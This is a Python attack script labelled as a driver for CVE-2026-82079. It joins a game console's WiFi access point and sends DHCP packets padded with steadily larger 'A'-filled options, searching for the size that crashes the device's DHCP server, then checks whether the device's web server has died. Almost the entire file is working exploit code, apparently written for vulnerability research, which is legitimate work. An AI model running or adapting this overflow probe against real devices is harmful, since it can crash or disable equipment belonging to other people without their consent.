#!/usr/bin/env python3
"""
CVE-2026-82079 — DHCP Attack Driver

Takes over WiFi management from NetworkManager to control the DHCP
conversation directly. Associates with the Switch AP using wpa_supplicant,
then sends crafted DHCP packets with progressively larger options.

The lp2p DHCP server only responds during initial connection setup,
so each test requires a disconnect/reconnect cycle.

Usage:
    sudo python3 -I dhcp_attack.py --iface wlp5s0 --ssid switch_F3DCDB0100S --psk <PSK_FROM_QR>
"""

import socket
import struct
import random
import time
import subprocess
import argparse
import json
import signal
import sys
import os
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "dhcp_attack"
DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def get_mac(iface: str) -> bytes:
    with open(f"/sys/class/net/{iface}/address") as f:
        return bytes(int(b, 16) for b in f.read().strip().split(":"))


def mac_str(mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac)


def run(cmd, timeout=10, check=False):
    """Run shell command, return (returncode, stdout, stderr)."""
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    if check and r.returncode != 0:
        print(f"  CMD FAILED: {cmd}")
        print(f"  stderr: {r.stderr.strip()}")
    return r.returncode, r.stdout.strip(), r.stderr.strip()


def stop_nm_on_iface(iface: str):
    """Stop NetworkManager from managing this interface."""
    run(f"nmcli device disconnect {iface}", timeout=5)
    time.sleep(0.5)
    run(f"nmcli device set {iface} managed no", timeout=5)
    run(f"ip addr flush dev {iface}", timeout=5)
    time.sleep(0.5)


def restore_nm(iface: str, ssid: str):
    """Restore NetworkManager control."""
    run("killall wpa_supplicant 2>/dev/null", timeout=5)
    time.sleep(1)
    run(f"nmcli device set {iface} managed yes", timeout=5)
    time.sleep(1)
    run(f"nmcli device wifi connect '{ssid}'", timeout=30)


def start_wpa_supplicant(iface: str, ssid: str, psk: str) -> subprocess.Popen | None:
    """Start wpa_supplicant to associate with the AP."""
    conf = f'/tmp/wpa_switch_{os.getpid()}.conf'
    with open(conf, 'w') as f:
        f.write(f'network={{\n  ssid="{ssid}"\n  psk="{psk}"\n  key_mgmt=WPA-PSK\n}}\n')

    # Kill any existing wpa_supplicant on this interface
    run(f"killall -q wpa_supplicant 2>/dev/null", timeout=3)
    time.sleep(0.5)

    proc = subprocess.Popen(
        ["wpa_supplicant", "-i", iface, "-c", conf, "-D", "nl80211", "-B"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    proc.wait(timeout=5)

    # Wait for association
    for i in range(15):
        rc, out, _ = run(f"wpa_cli -i {iface} status 2>/dev/null | grep wpa_state")
        if "COMPLETED" in out:
            print(f"  WiFi associated after {i+1}s")
            os.unlink(conf)
            return proc
        time.sleep(1)

    print(f"  WiFi association FAILED")
    os.unlink(conf)
    return None


def build_dhcp_discover(mac: bytes, extra_options: bytes = b"",
                        hostname: bytes = b"darkstar") -> tuple[bytes, int]:
    """Build DHCP DISCOVER with custom options."""
    xid = random.randint(0, 0xFFFFFFFF)

    pkt = struct.pack("!BBBB", 1, 1, 6, 0)  # BOOTREQUEST, Ethernet, 6-byte MAC
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)  # flags=broadcast
    pkt += b"\x00" * 16  # ciaddr/yiaddr/siaddr/giaddr
    pkt += mac + b"\x00" * 10  # chaddr (16 bytes)
    pkt += b"\x00" * 64   # sname
    pkt += b"\x00" * 128  # file

    # Magic cookie
    pkt += b"\x63\x82\x53\x63"

    # Required options
    pkt += bytes([53, 1, 1])  # DHCP DISCOVER
    pkt += bytes([61, 7, 1]) + mac  # Client ID
    pkt += bytes([55, 4, 1, 3, 6, 28])  # Param request list
    pkt += bytes([57, 2, 2, 64])  # Max message size = 576
    pkt += bytes([12, len(hostname)]) + hostname  # Hostname

    # Extra options (overflow payload)
    pkt += extra_options

    pkt += bytes([255])  # END
    return pkt, xid


def build_dhcp_request(mac: bytes, offered_ip: bytes, server_ip: bytes,
                       extra_options: bytes = b"") -> tuple[bytes, int]:
    """Build DHCP REQUEST with custom options."""
    xid = random.randint(0, 0xFFFFFFFF)

    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64
    pkt += b"\x00" * 128

    pkt += b"\x63\x82\x53\x63"
    pkt += bytes([53, 1, 3])  # DHCP REQUEST
    pkt += bytes([61, 7, 1]) + mac
    pkt += bytes([54, 4]) + server_ip
    pkt += bytes([50, 4]) + offered_ip
    pkt += bytes([55, 4, 1, 3, 6, 28])
    pkt += bytes([57, 2, 2, 64])
    pkt += bytes([12, 8]) + b"darkstar"

    pkt += extra_options
    pkt += bytes([255])
    return pkt, xid


def build_overflow_options(total_size: int, fill_byte: int = 0x41) -> bytes:
    """Build DHCP options totaling target bytes using multiple option codes."""
    options = b""
    remaining = total_size
    opt_codes = [43, 60, 77, 12] + list(range(224, 255))

    for opt_code in opt_codes:
        if remaining <= 2:
            break
        value_len = min(255, remaining - 2)
        if value_len <= 0:
            break
        options += bytes([opt_code, value_len]) + bytes([fill_byte] * value_len)
        remaining -= (2 + value_len)

    return options


def do_dhcp_exchange(iface: str, mac: bytes, extra_discover: bytes = b"",
                     extra_request: bytes = b"",
                     timeout: float = 5) -> dict:
    """Perform a full DHCP DISCOVER → OFFER → REQUEST → ACK exchange.

    Returns dict with exchange details and timing.
    """
    result = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "extra_discover_bytes": len(extra_discover),
        "extra_request_bytes": len(extra_request),
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    sock.settimeout(timeout)

    try:
        sock.bind(("0.0.0.0", DHCP_CLIENT_PORT))
    except OSError as e:
        result["error"] = f"bind failed: {e}"
        sock.close()
        return result

    # Phase 1: DISCOVER
    discover_pkt, xid = build_dhcp_discover(mac, extra_options=extra_discover)
    result["discover_size"] = len(discover_pkt)

    t0 = time.monotonic()
    sock.sendto(discover_pkt, ("255.255.255.255", DHCP_SERVER_PORT))

    try:
        offer_data, offer_addr = sock.recvfrom(4096)
        t1 = time.monotonic()
        result["offer_received"] = True
        result["offer_time_ms"] = round((t1 - t0) * 1000, 1)
        result["offer_size"] = len(offer_data)

        # Parse offered IP
        offered_ip = offer_data[16:20]
        server_ip = offer_data[20:24]
        if server_ip == b"\x00\x00\x00\x00":
            server_ip = bytes([192, 168, 0, 1])
        result["offered_ip"] = ".".join(str(b) for b in offered_ip)

    except socket.timeout:
        result["offer_received"] = False
        result["offer_time_ms"] = round((time.monotonic() - t0) * 1000, 1)
        sock.close()
        return result

    # Phase 2: REQUEST (with optional overflow payload)
    request_pkt, _ = build_dhcp_request(mac, offered_ip, server_ip,
                                        extra_options=extra_request)
    result["request_size"] = len(request_pkt)

    t2 = time.monotonic()
    sock.sendto(request_pkt, ("255.255.255.255", DHCP_SERVER_PORT))

    try:
        ack_data, ack_addr = sock.recvfrom(4096)
        t3 = time.monotonic()
        result["ack_received"] = True
        result["ack_time_ms"] = round((t3 - t2) * 1000, 1)
        result["ack_size"] = len(ack_data)

        # Parse ACK details
        cookie = ack_data.find(b"\x63\x82\x53\x63")
        if cookie >= 0:
            pos = cookie + 4
            while pos < len(ack_data) and ack_data[pos] != 255:
                if ack_data[pos] == 0:
                    pos += 1
                    continue
                ot, ol = ack_data[pos], ack_data[pos + 1]
                if ot == 53:
                    result["ack_msg_type"] = ack_data[pos + 2]
                if ot == 51 and ol == 4:
                    result["lease_time"] = struct.unpack("!I", ack_data[pos+2:pos+6])[0]
                pos += 2 + ol

    except socket.timeout:
        result["ack_received"] = False
        result["ack_time_ms"] = round((time.monotonic() - t2) * 1000, 1)

    sock.close()
    return result


def check_switch_alive(timeout=3) -> bool:
    """Check if the Switch HTTP server is responding."""
    import http.client
    try:
        c = http.client.HTTPConnection("192.168.0.1", timeout=timeout)
        c.request("GET", "/data.json")
        r = c.getresponse()
        c.close()
        return r.status == 200
    except Exception:
        return False


def run_boundary_search(iface: str, ssid: str, psk: str):
    """Find the DHCP option size that crashes the server.

    Each test requires a full disconnect → reconnect → DHCP exchange cycle.
    Tests oversized options in the DISCOVER message first, then REQUEST.
    """
    mac = get_mac(iface)
    print(f"\n{'='*60}")
    print(f"BOUNDARY SEARCH — CVE-2026-82079")
    print(f"{'='*60}")
    print(f"MAC: {mac_str(mac)}")
    print(f"Strategy: disconnect → reconnect → DHCP with oversized options")
    print(f"Each test = one WiFi cycle (~15-20s)\n")

    results = []

    # Test sizes: start small, exponential growth
    # Each DHCP option: 2-byte header + up to 255 bytes value = 257 bytes
    # With 35 option codes available, max ~8925 bytes
    sizes = [0, 64, 128, 256, 512, 768, 1024, 1536, 2048, 3072, 4096, 6144, 7680]

    for idx, target_size in enumerate(sizes):
        print(f"--- Test {idx+1}/{len(sizes)}: {target_size}B extra options ---")

        # Step 1: Stop NM and kill wpa_supplicant
        print(f"  Disconnecting...")
        stop_nm_on_iface(iface)
        time.sleep(2)

        # Step 2: Associate with wpa_supplicant
        print(f"  Associating with {ssid}...")
        wpa = start_wpa_supplicant(iface, ssid, psk)
        if wpa is None:
            print(f"  SKIP — could not associate")
            results.append({"size": target_size, "error": "association_failed"})
            continue

        time.sleep(1)

        # Step 3: DHCP exchange with oversized options
        extra = build_overflow_options(target_size) if target_size > 0 else b""
        print(f"  DHCP exchange (extra={len(extra)}B)...")

        exchange = do_dhcp_exchange(iface, mac, extra_discover=extra)
        exchange["target_overflow_bytes"] = target_size

        if exchange.get("offer_received"):
            if exchange.get("ack_received"):
                ack_type = exchange.get("ack_msg_type", "?")
                lease = exchange.get("lease_time", "?")
                print(f"  ✓ OFFER+ACK (type={ack_type}, lease={lease}s, "
                      f"offer={exchange['offer_time_ms']}ms)")
                exchange["status"] = "normal"
            else:
                print(f"  ⚠ OFFER but NO ACK — partial crash?")
                exchange["status"] = "partial_crash"
        else:
            print(f"  ✗ NO OFFER after {exchange.get('offer_time_ms', '?')}ms")

            # Check if Switch is still alive
            # Need IP first
            run(f"ip addr add 192.168.0.2/24 dev {iface}", timeout=3)
            time.sleep(0.5)

            if check_switch_alive():
                print(f"  Switch HTTP still alive — DHCP server just rejected/ignored")
                exchange["status"] = "rejected"
            else:
                print(f"  ⚠ Switch HTTP also down — possible CRASH!")
                exchange["status"] = "crashed"

        results.append(exchange)

        # Quick check: if we got a crash, note it
        if exchange.get("status") == "crashed":
            print(f"\n  ★★★ POSSIBLE CRASH AT {target_size}B OPTIONS! ★★★")
            # Wait and recheck
            print(f"  Waiting 15s for Switch recovery...")
            time.sleep(15)
            if check_switch_alive():
                exchange["recovered"] = True
                print(f"  Switch recovered")
            else:
                exchange["recovered"] = False
                print(f"  Switch still down — HARD CRASH")

        time.sleep(1)

    # Save results
    summary = {
        "test": "dhcp_overflow_boundary_search",
        "cve": "CVE-2026-82079",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "mac": mac_str(mac),
        "results": results,
    }

    path = evidence_dir() / "boundary_search.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print(f"\nResults saved: {path}")

    # Print summary
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    for r in results:
        size = r.get("target_overflow_bytes", r.get("size", "?"))
        status = r.get("status", r.get("error", "?"))
        print(f"  {size:5}B → {status}")

    return summary


def run_single_test(iface: str, ssid: str, psk: str, size: int, phase: str = "discover"):
    """Run a single DHCP test with specific option size."""
    mac = get_mac(iface)
    print(f"Single test: {size}B in {phase} phase")

    stop_nm_on_iface(iface)
    time.sleep(2)

    wpa = start_wpa_supplicant(iface, ssid, psk)
    if wpa is None:
        print("Could not associate")
        return

    time.sleep(1)

    extra = build_overflow_options(size) if size > 0 else b""

    if phase == "discover":
        exchange = do_dhcp_exchange(iface, mac, extra_discover=extra)
    else:
        exchange = do_dhcp_exchange(iface, mac, extra_request=extra)

    print(json.dumps(exchange, indent=2, default=str))
    return exchange


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-82079 DHCP Attack Driver")
    parser.add_argument("--iface", required=True, help="WiFi interface")
    parser.add_argument("--ssid", default="switch_F3DCDB0100S", help="Switch AP SSID")
    parser.add_argument("--psk", required=True, help="Switch AP password")
    parser.add_argument("--mode", choices=["search", "single", "request-search"],
                        default="search",
                        help="search=boundary search, single=one test, "
                             "request-search=overflow in REQUEST phase")
    parser.add_argument("--size", type=int, default=256,
                        help="Option size for single test")
    parser.add_argument("--phase", choices=["discover", "request"], default="discover",
                        help="Which DHCP message to overflow (single mode)")
    args = parser.parse_args()

    print("╔══════════════════════════════════════════════════════════╗")
    print("║  CVE-2026-82079 — DHCP Attack Driver                   ║")
    print("║  Disconnect/reconnect cycle for each overflow test      ║")
    print("╚══════════════════════════════════════════════════════════╝")

    # Ensure running as root
    if os.geteuid() != 0:
        print("ERROR: Must run as root (sudo)")
        sys.exit(1)

    # Cleanup handler
    def cleanup(sig=None, frame=None):
        print(f"\nCleaning up — restoring NetworkManager...")
        restore_nm(args.iface, args.ssid)
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        if args.mode == "search":
            run_boundary_search(args.iface, args.ssid, args.psk)
        elif args.mode == "single":
            run_single_test(args.iface, args.ssid, args.psk, args.size, args.phase)
        elif args.mode == "request-search":
            # Same boundary search but overflow goes in REQUEST, not DISCOVER
            print("TODO: REQUEST phase overflow search")
    finally:
        print(f"\nRestoring NetworkManager control...")
        restore_nm(args.iface, args.ssid)
        print("Done.")


if __name__ == "__main__":
    main()
